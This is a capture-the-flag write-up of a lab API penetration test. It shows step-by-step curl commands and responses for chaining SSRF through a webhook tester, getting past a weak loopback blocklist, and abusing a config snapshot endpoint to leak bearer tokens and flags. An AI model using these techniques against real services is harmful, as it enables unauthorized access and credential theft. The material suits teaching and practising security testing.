# NimbusStack API Penetration Test — Writeup

**Target:** `nimbus.prod.local` **Scenario:** Start as an unauthenticated outsider and chain real API vulnerabilities to reach full internal (vault) access. One continuous breach across 5 flags — each stage unlocks the next.

**Status:** Stage 1 complete (Flag 1 captured). Stage 2 in progress.

---

## Stage 1 — Unauthenticated Recon → SSRF → Internal Metadata Leak

### Step 1: Basic recon

We started by looking at what an outsider with zero credentials can see.

```
curl -i http://nimbus.prod.local/
```

The homepage was a normal-looking dashboard, but it had a few things worth noting:

- An HTML comment revealed the build tag: `nimbus-console v4.7.2 (orbital-breach)`. The word "orbital" turned out to be a recurring naming pattern used throughout the whole challenge (incident IDs, tokens, etc.), so it was a hint worth remembering.
- An incident banner mentioned change `CHG-2026-441` and a config snapshot `snap-prod-orb-77`, and said _"internal config snapshots may be served from the support network during this window."_ This told us there's an internal network of services behind the public site.
- The page included a **webhook diagnostics tool** — a form where you type a URL, and the server sends a real HTTP request to that URL from its own backend, then shows you the response. A code comment even said: _"migrate legacy diagnostics off the support-VPC egress path before GA"_ — meaning the developers already knew this feature reaches into the internal VPC.

This webhook tester is the classic shape of an **SSRF (Server-Side Request Forgery)** vulnerability: the server will fetch any URL we give it, and hand us back the result. Since it runs from inside the "support VPC," we can potentially use it to reach internal services that we, as outsiders, could never talk to directly.

### Step 2: Checking `robots.txt`

```
curl -i http://nimbus.prod.local/robots.txt
```

This listed disallowed paths: `/admin/`, `/internal/`, `/backups/`, `/api/`, `/.git/`. A `robots.txt` disallow doesn't block access — it's just a hint to search engines. For us, it's actually a map of interesting paths to check.

### Step 3: Testing the webhook tool with a normal external URL

```
curl -i -X POST http://nimbus.prod.local/api/portal/webhook/test \
  -H "Content-Type: application/json" \
  -d '{"url":"https://example.com"}'
```

Result: DNS resolution failed for `example.com`. This told us the server has **no real internet/DNS egress** — meaning this SSRF is only useful for reaching _internal_ hosts, not the public internet. That's fine — internal is exactly what we want.

### Step 4: Probing for a blacklist

```
curl -s -X POST .../webhook/test -d '{"url":"http://127.0.0.1"}'
curl -s -X POST .../webhook/test -d '{"url":"http://localhost"}'
```

Both got blocked with: `"direct private endpoint denied by webhook policy"`.

This told us the developers added a filter — but it's a **simple pattern-based blacklist** (blocking the literal strings `127.0.0.1` and `localhost`), not a real network-level restriction. This is a common, exploitable mistake: it doesn't block requests to internal _hostnames_ it doesn't know about.

### Step 5: Finding internal hostnames

The public `/status` endpoint leaked the internal service mesh:

```
curl -s http://nimbus.prod.local/status
```

Response included:

```json
"service_mesh": {
  "nodes": ["config-api", "forge-ci", "registry-api", "kube-api", "vault-core"],
  "port": 8080
}
```

This is the entire attack path for the whole CTF: **config-api → forge-ci → registry-api → kube-api → vault-core**. Five services, five flags.

### Step 6: Using the SSRF against internal hostnames

Since the blacklist only blocked loopback IPs/`localhost`, and not these mesh hostnames, we tried:

```
curl -s -X POST .../webhook/test -d '{"url":"http://config-api:8080"}'
```

This worked (`"status":"delivered"`) and returned the service's self-description:

```json
{"service":"config-api","tier":"internal","paths":["/internal/preview","/api/config/"]}
```

We now had our first real internal endpoint to explore.

### Step 7: Exploring `/internal/preview`

```
curl -s -X POST .../webhook/test -d '{"url":"http://config-api:8080/internal/preview"}'
```

Response:

```json
{"status":"preview-only","available_resources":["bootstrap"],"trace_required":"ORBITAL-BOOTSTRAP"}
```

This told us two things:

- There's a resource called `bootstrap` we can try to access.
- The service expects something called a **trace** with value `ORBITAL-BOOTSTRAP` — likely meant to be sent as a header, but since we didn't have header control yet, we tried it as a query parameter instead.

### Step 8: Supplying the trace + resource together

```
curl -s -X POST .../webhook/test \
  -d '{"url":"http://config-api:8080/internal/preview?resource=bootstrap&trace=ORBITAL-BOOTSTRAP"}'
```

**Result — Flag 1:**

```json
{
  "service": "orbital-config-api",
  "classification": "support-diagnostic",
  "incident": "ORB-DEPLOY-77",
  "stage": "bootstrap metadata preview",
  "flag": "ORB{ssrf_bootstrap_into_orbital_metadata}",
  "next_capability": {
    "type": "Bearer token",
    "token": "cfg_live_9f4d12_orbital_bootstrap",
    "allowed_scope": "config:catalog, config:snapshot-preview"
  }
}
```

**🚩 FLAG 1: `ORB{ssrf_bootstrap_into_orbital_metadata}`**

### Vulnerability summary for Stage 1

|Item|Detail|
|---|---|
|Vulnerability class|Server-Side Request Forgery (SSRF) with weak/incomplete blacklist|
|Root cause|Webhook tester fetches any user-supplied URL; blocklist only matches literal `127.0.0.1` / `localhost`, not internal DNS hostnames|
|Impact|Unauthenticated outsider can reach internal-only services (`config-api`, `forge-ci`, `registry-api`, and likely more) on the internal service mesh|
|Credential obtained|Bearer token `cfg_live_9f4d12_orbital_bootstrap`, scoped to `config:catalog` and `config:snapshot-preview`|

---

## Stage 2 — From Bootstrap Token to Restricted Config Snapshot

### Dead end: trying to smuggle headers through the SSRF proxy

We first assumed the SSRF proxy (`/api/portal/webhook/test`) could be made to send a custom `Authorization` header to internal hosts. We tried many approaches: a `headers` object in the JSON body, alternate field names (`header`, `token`, `auth_token`, `secret`, `bearer_token`), query-string variants (`?token=`, `?auth=`, `?config_token=`), URL userinfo syntax (`user:pass@host`), and even CRLF injection inside the `url` string to try to smuggle a raw header line. All of these failed or were rejected.

**The reason became clear once we pulled the OpenAPI schema:**

```
curl -s http://nimbus.prod.local/api/portal/openapi.json
```

This one file was a huge turning point — it listed **every route in the entire application** (portal, config, forge, registry, kube, vault) in a single document, and confirmed:

- The `WebhookTest` request model has **exactly one field: `url`**. Any extra JSON fields we sent (`headers`, `token`, etc.) were silently dropped by the server's validation — never actually forwarded anywhere.
- `/api/config/catalog` expects `authorization` as a real HTTP **header**, which this proxy has no way to set.
- The proxy only ever issues **GET** requests, so POST-only endpoints are not reachable through it at all (confirmed via `405 Method Not Allowed`).

**Key realization:** the `/status` page's `service_mesh` list (`config-api`, `forge-ci`, `registry-api`, `kube-api`, `vault-core`, port 8080) led us to assume these were separate internal-only hosts reachable only via SSRF. That assumption was wrong — the OpenAPI doc showed all of `/api/config/*`, `/api/forge/*`, `/api/registry/*`, `/api/kube/*`, and `/api/vault/*` are simply routes mounted on the **same public application** (`nimbus.prod.local`, port 80). The "internal hostnames" are logical names, not a separate network we needed SSRF to cross for this stage.

### Step 1: Calling the config endpoint directly (no SSRF needed)

```
curl -i http://nimbus.prod.local/api/config/catalog \
  -H "Authorization: Bearer cfg_live_9f4d12_orbital_bootstrap"
```

This returned `200 OK` with self-documenting data, including the exact allowed values for a snapshot request:

```json
{
  "collections": [
    {"name":"public-runtime-notes","classification":"support"},
    {"name":"deployment-snapshots","classification":"restricted","incident":"ORB-DEPLOY-77"},
    {"name":"change-control","classification":"restricted","change":"CHG-2026-441"}
  ],
  "schema": {"snapshot_query": {
    "environment": "public|staging|production",
    "purpose_code": "support-debug|drift-audit|billing-export",
    "merge_strategy": "server-default|client-override"
  }},
  "operator_note": "Production-scope snapshots follow a legacy compatibility profile used by rollback automation; default purpose and merge handling are rejected for this scope."
}
```

### Step 2: First snapshot attempt (using defaults) — blocked

```
curl -s -X POST http://nimbus.prod.local/api/config/snapshot \
  -H "Authorization: Bearer cfg_live_9f4d12_orbital_bootstrap" \
  -d '{"collection":"deployment-snapshots","environment":"production","incident":"ORB-DEPLOY-77"}'
```

Result: `{"status":"blocked","message":"Snapshot request did not satisfy the legacy compatibility profile required for this scope."}` — confirming the default `purpose_code`/`merge_strategy` are rejected for `environment=production`.

### Step 3: Supplying explicit non-default values — Flag 2

```
curl -s -X POST http://nimbus.prod.local/api/config/snapshot \
  -H "Authorization: Bearer cfg_live_9f4d12_orbital_bootstrap" \
  -d '{"collection":"deployment-snapshots","environment":"production","purpose_code":"drift-audit","merge_strategy":"client-override","incident":"ORB-DEPLOY-77"}'
```

**Result:**

```json
{
  "status": "snapshot-exported",
  "snapshot_id": "snap-prod-orb-77-441",
  "classification": "restricted-change-control",
  "flag": "ORB{metadata_snapshots_are_not_secret_stores}",
  "incident": "ORB-DEPLOY-77",
  "change": "CHG-2026-441",
  "forge": {
    "base_path": "/api/forge/",
    "token": "forge_ci_chg_2026_441_reader",
    "repo": "nimbus/orbital-api",
    "branch_protection": "reviewer-bot approval required for pipeline changes",
    "review_policy": "PIPE-EXC-441"
  }
}
```

**🚩 FLAG 2: `ORB{metadata_snapshots_are_not_secret_stores}`**

### Vulnerability summary for Stage 2

|Item|Detail|
|---|---|
|Vulnerability class|Broken access control / business-logic bypass on a metadata "diagnostics" endpoint|
|Root cause|A snapshot-export feature meant for internal support-debug use accepts attacker-controlled `environment`, `purpose_code`, and `merge_strategy` values with no real authorization beyond holding _a_ valid-looking bearer token; the "legacy compatibility" parameter combination unlocks restricted, change-control-classified data|
|Impact|Exposes a restricted `deployment-snapshots` collection tied to a real incident/change (`ORB-DEPLOY-77` / `CHG-2026-441`), including a credential for the next internal service|
|Credential obtained|Bearer token `forge_ci_chg_2026_441_reader`, scoped to Forge CI (`/api/forge/`), repo `nimbus/orbital-api`, under review policy `PIPE-EXC-441`|

---

## Stage 3 — Forge CI (in progress)

_(To be documented as we progress — starting point: `/api/forge/repo`, `/api/forge/pr`, `/api/forge/pr/{pr_id}/review`, `/api/forge/pr/{pr_id}/run`, `/api/forge/artifacts/{artifact_id}`, all under repo `nimbus/orbital-api`, with branch protection requiring reviewer-bot approval per policy `PIPE-EXC-441`.)_
